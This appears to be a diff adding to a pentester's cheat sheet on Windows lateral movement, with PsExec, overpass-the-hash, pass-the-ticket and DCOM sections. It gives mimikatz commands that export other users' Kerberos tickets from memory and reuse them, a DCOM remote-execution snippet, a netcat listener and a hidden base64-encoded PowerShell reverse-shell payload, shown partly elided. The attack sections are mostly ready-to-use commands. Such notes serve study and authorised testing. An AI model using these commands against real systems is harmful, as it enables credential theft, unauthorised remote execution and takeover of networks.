@@ -49,8 +49,9 @@ Enter Session 1
 For this to work, ADMIN$ needs to be shared, and the authenticating user needs to be member of the local admin group.
 
 ```
-./PsExec64.exe -i  ${RHOST} -u ${DOMAIN}\${USER} -p ${PASSWORD} cmd
+.\PsExec64.exe -i \\${COMPUTER_NAME} -u ${DOMAIN}\${USER} -p ${PASSWORD} cmd
 ```
+Note that it is important to use `$COMPUTER_NAME` for this, and not the IP.
 
 
 ## Overpass the hash
@@ -74,3 +75,52 @@ After getting a TGS, we can now eg. use PsExec to move to a new machine:
 ```
 .\PsExec.exe \\${COMPUTER_NAME} cmd
 ```
+
+## Pass the ticket
+
+If sessions from other users are active, we can take their TGS tickets from memory and use them ourselves (assuming we are local admin of course):
+
+```
+sekurlsa::tickets /export
+```
+
+Afterwards, files are saved in the .kirbi format, so we can look for them with:
+
+```
+dir *.kirbi
+```
+
+
+and it can be loaded into memory of our current session like so:
+
+```
+kerberos::ptt ${FILE_NAME}.kirbi
+```
+
+now, using `net` or `PsExec.exe` will be done with this ticket.
+
+If using `PsExec`, remember to authenticate with the ticket first. eg. with
+```
+net use \\${COMPUTER_NAME}
+```
+
+## DCOM
+first, we specify the IP of `$RHOST`:
+
+```powershell
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$RHOST"))
+```
+Remember to setup the usual listener:
+
+```
+nc -nvlp ${ATTACK_PORT} 
+```
+
+with "The usual payload":
+
+```
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+
+
